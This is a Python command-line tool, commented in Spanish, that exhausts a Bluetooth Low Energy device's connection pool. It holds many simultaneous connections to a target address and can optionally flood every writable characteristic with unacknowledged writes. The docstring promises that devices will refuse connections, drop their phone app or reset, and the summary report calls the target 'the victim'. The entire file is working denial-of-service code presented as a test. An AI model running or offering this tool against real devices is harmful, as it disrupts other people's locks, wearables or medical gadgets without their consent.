"""
ble_exhaust.py — BLE Connection Pool Exhaustion Test

Abre tantas conexiones BLE simultáneas al dispositivo objetivo como sea
posible y las mantiene abiertas. La mayoría de dispositivos BLE solo
aceptan 1-4 conexiones simultáneas — cuando el pool se llena, rechazan
nuevas conexiones y pueden volverse lentos o reiniciarse.

Mientras las conexiones están abiertas, cada worker también inunda el
dispositivo con Write-Without-Response en todos los characteristics
escribibles encontrados (sin esperar ACK = máxima presión al buffer).

Efecto visible:
  • El dispositivo empieza a rechazar conexiones ("device busy" / timeout)
  • La app del fabricante en el teléfono puede desconectarse o lagear
  • Algunos dispositivos rebotean (reset interno por buffer overflow ATT)

Uso:
    python ble_exhaust.py <ADDRESS>
    python ble_exhaust.py <ADDRESS> --max-conns 8 --duration 60
    python ble_exhaust.py <ADDRESS> --max-conns 12 --write-flood --write-size 180
    python ble_exhaust.py <ADDRESS> --duration 0   # sin límite de tiempo

Requiere: bleak  |  Linux (BlueZ) recomendado para máximo efecto
"""

from __future__ import annotations

import argparse
import asyncio
import sys
import time
from dataclasses import dataclass, field

from bleak import BleakClient, BleakScanner
from bleak.exc import BleakError


# ─────────────────────────────── helpers ────────────────────────────────────

def _ts() -> str:
    return time.strftime("%H:%M:%S")


def _bar(ok: int, fail: int, width: int = 20) -> str:
    total = ok + fail
    if total == 0:
        return "[" + " " * width + "]"
    filled = int(width * ok / total)
    return "[" + "█" * filled + "░" * (width - filled) + "]"


# ─────────────────────────────── core ───────────────────────────────────────

@dataclass
class SlotStats:
    slot: int
    connected: bool = False
    connect_attempts: int = 0
    connects_ok: int = 0
    connects_fail: int = 0
    writes_sent: int = 0
    writes_fail: int = 0
    error: str = ""


@dataclass
class ExhaustReport:
    address: str
    max_conns_requested: int
    peak_simultaneous: int = 0
    total_connect_ok: int = 0
    total_connect_fail: int = 0
    total_writes_sent: int = 0
    duration_s: float = 0.0
    slots: list[SlotStats] = field(default_factory=list)


async def _find_writable_chars(client: BleakClient) -> list[str]:
    writable = []
    try:
        for svc in client.services:
            for ch in svc.characteristics:
                props = ch.properties
                if "write-without-response" in props or "write" in props:
                    writable.append(ch.uuid)
    except Exception:
        pass
    return writable


async def _write_flood_task(
    client: BleakClient,
    uuids: list[str],
    stats: SlotStats,
    payload: bytes,
    stop: asyncio.Event,
) -> None:
    """Floods all writable characteristics with Write-Without-Response."""
    while not stop.is_set():
        if not client.is_connected:
            break
        for uuid in uuids:
            if stop.is_set():
                break
            try:
                await client.write_gatt_char(uuid, payload, response=False)
                stats.writes_sent += 1
            except Exception:
                stats.writes_fail += 1


async def _connection_slot(
    slot: int,
    address: str,
    connect_timeout: float,
    hold_duration: float,              # seconds to hold connection open (0 = indefinite)
    write_flood: bool,
    write_size: int,
    stats: SlotStats,
    global_stop: asyncio.Event,
    connected_event: asyncio.Event,    # set when this slot has an open connection
) -> None:
    payload = bytes([0xAA] * write_size)

    while not global_stop.is_set():
        stats.connect_attempts += 1
        try:
            async with BleakClient(address, timeout=connect_timeout) as client:
                stats.connected = True
                stats.connects_ok += 1
                connected_event.set()
                print(
                    f"  [{_ts()}] slot {slot:02d} conectado  "
                    f"(total conns abiertas now)"
                )

                stop_write = asyncio.Event()

                if write_flood:
                    writable = await _find_writable_chars(client)
                    flood_task = asyncio.create_task(
                        _write_flood_task(client, writable, stats, payload, stop_write)
                    )
                else:
                    flood_task = None

                # Hold connection open
                start = time.monotonic()
                while client.is_connected and not global_stop.is_set():
                    elapsed = time.monotonic() - start
                    if hold_duration > 0 and elapsed >= hold_duration:
                        break
                    await asyncio.sleep(0.05)

                stop_write.set()
                if flood_task:
                    try:
                        await asyncio.wait_for(flood_task, timeout=1.0)
                    except asyncio.TimeoutError:
                        flood_task.cancel()

        except (BleakError, asyncio.TimeoutError, OSError) as exc:
            stats.connects_fail += 1
            stats.error = str(exc)[:80]
        finally:
            stats.connected = False
            connected_event.clear()

        if global_stop.is_set():
            break
        # Small back-off before retry so we don't burn CPU on constant fail
        await asyncio.sleep(0.1)


async def run_exhaust_test(
    address: str,
    max_conns: int = 6,
    duration: float = 30.0,
    connect_timeout: float = 8.0,
    write_flood: bool = False,
    write_size: int = 100,
    stagger_s: float = 0.3,
) -> ExhaustReport:
    """
    Opens `max_conns` simultaneous BLE connections to `address` and holds them
    open for `duration` seconds (0 = run until Ctrl-C).
    """
    report = ExhaustReport(address=address, max_conns_requested=max_conns)
    slots: list[SlotStats] = [SlotStats(slot=i) for i in range(max_conns)]
    report.slots = slots

    global_stop = asyncio.Event()
    connected_events = [asyncio.Event() for _ in range(max_conns)]

    print(f"\n[{_ts()}] Iniciando pool exhaustion → {address}")
    print(f"  max conexiones simultáneas : {max_conns}")
    print(f"  duración                   : {duration}s  (0 = sin límite)")
    print(f"  write flood                : {'SÍ  size=' + str(write_size) if write_flood else 'NO'}")
    print(f"  stagger entre slots        : {stagger_s}s\n")

    t_start = time.monotonic()

    # Launch all slots with a stagger to avoid thundering-herd on the adapter
    tasks = []
    for i, (stat, ev) in enumerate(zip(slots, connected_events)):
        hold = max(0.0, duration - i * stagger_s) if duration > 0 else 0.0
        t = asyncio.create_task(
            _connection_slot(
                slot=i,
                address=address,
                connect_timeout=connect_timeout,
                hold_duration=hold,
                write_flood=write_flood,
                write_size=write_size,
                stats=stat,
                global_stop=global_stop,
                connected_event=ev,
            )
        )
        tasks.append(t)
        await asyncio.sleep(stagger_s)

    # Monitor + auto-stop
    async def _monitor() -> None:
        while not global_stop.is_set():
            active = sum(1 for s in slots if s.connected)
            report.peak_simultaneous = max(report.peak_simultaneous, active)
            ok = sum(s.connects_ok for s in slots)
            fail = sum(s.connects_fail for s in slots)
            writes = sum(s.writes_sent for s in slots)
            elapsed = time.monotonic() - t_start
            bar = _bar(ok, ok + fail)
            print(
                f"\r[{_ts()}] abiertas={active:2d}/{max_conns}  "
                f"ok={ok}  fail={fail} {bar}  "
                f"writes={writes}  t={elapsed:.0f}s   ",
                end="",
                flush=True,
            )
            if duration > 0 and elapsed >= duration + max_conns * stagger_s + 2:
                global_stop.set()
                break
            await asyncio.sleep(1.0)

    monitor_task = asyncio.create_task(_monitor())

    try:
        if duration > 0:
            await asyncio.sleep(duration + max_conns * stagger_s + 3)
            global_stop.set()
        else:
            # Run until Ctrl-C
            await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        global_stop.set()
    finally:
        global_stop.set()
        monitor_task.cancel()
        for t in tasks:
            t.cancel()
        await asyncio.gather(monitor_task, *tasks, return_exceptions=True)

    elapsed = time.monotonic() - t_start
    report.total_connect_ok = sum(s.connects_ok for s in slots)
    report.total_connect_fail = sum(s.connects_fail for s in slots)
    report.total_writes_sent = sum(s.writes_sent for s in slots)
    report.duration_s = elapsed

    _print_report(report)
    return report


def _print_report(r: ExhaustReport) -> None:
    print(f"\n\n{'═' * 60}")
    print(f"  BLE EXHAUST REPORT — {r.address}")
    print(f"{'═' * 60}")
    print(f"  Conexiones solicitadas  : {r.max_conns_requested}")
    print(f"  Pico simultáneo real    : {r.peak_simultaneous}  ← max que aceptó el device")
    print(f"  Connects OK             : {r.total_connect_ok}")
    print(f"  Connects FAIL           : {r.total_connect_fail}")
    print(f"  Writes enviados         : {r.total_writes_sent}")
    print(f"  Duración total          : {r.duration_s:.1f}s")
    print(f"{'─' * 60}")
    print(f"  {'Slot':>4}  {'OK':>5}  {'FAIL':>5}  {'Writes':>8}  Último error")
    print(f"  {'────':>4}  {'──':>5}  {'────':>5}  {'──────':>8}  ────────────")
    for s in r.slots:
        err = s.error[:35] if s.error else "—"
        print(f"  {s.slot:>4}  {s.connects_ok:>5}  {s.connects_fail:>5}  {s.writes_sent:>8}  {err}")
    print(f"{'═' * 60}\n")

    if r.peak_simultaneous == 0:
        print("  ⚠  El dispositivo rechazó TODAS las conexiones.")
        print("     Verifica que esté encendido y en rango (<2m).\n")
    elif r.peak_simultaneous < r.max_conns_requested:
        n = r.max_conns_requested - r.peak_simultaneous
        print(f"  ✓  Pool lleno: el device aceptó máx {r.peak_simultaneous} conex. simultáneas.")
        print(f"     {n} slots rechazados — el pool de conexiones de la víctima estaba agotado.\n")
    else:
        print(f"  ✓  Todas las {r.peak_simultaneous} conexiones aceptadas (prueba con --max-conns más alto).\n")


# ─────────────────────────────── CLI ────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="BLE Connection Pool Exhaustion Test",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("address", help="BD_ADDR o UUID CoreBluetooth del dispositivo")
    p.add_argument(
        "--max-conns", type=int, default=6,
        metavar="N",
        help="Número de conexiones simultáneas a intentar (default: 6)",
    )
    p.add_argument(
        "--duration", type=float, default=30.0,
        metavar="S",
        help="Segundos totales de prueba (0=sin límite, Ctrl-C para parar; default: 30)",
    )
    p.add_argument(
        "--timeout", type=float, default=8.0,
        metavar="S",
        help="Timeout de conexión por slot (default: 8s)",
    )
    p.add_argument(
        "--write-flood", action="store_true",
        help="Inundar características escribibles con Write-Without-Response mientras las conexiones están abiertas",
    )
    p.add_argument(
        "--write-size", type=int, default=100,
        metavar="B",
        help="Bytes por paquete de escritura (default: 100)",
    )
    p.add_argument(
        "--stagger", type=float, default=0.3,
        metavar="S",
        help="Segundos entre apertura de cada slot (default: 0.3)",
    )
    return p


async def _main() -> None:
    args = _build_parser().parse_args()
    try:
        await run_exhaust_test(
            address=args.address,
            max_conns=args.max_conns,
            duration=args.duration,
            connect_timeout=args.timeout,
            write_flood=args.write_flood,
            write_size=args.write_size,
            stagger_s=args.stagger,
        )
    except KeyboardInterrupt:
        print("\n\n  Interrumpido por el usuario.")


if __name__ == "__main__":
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        sys.exit(0)
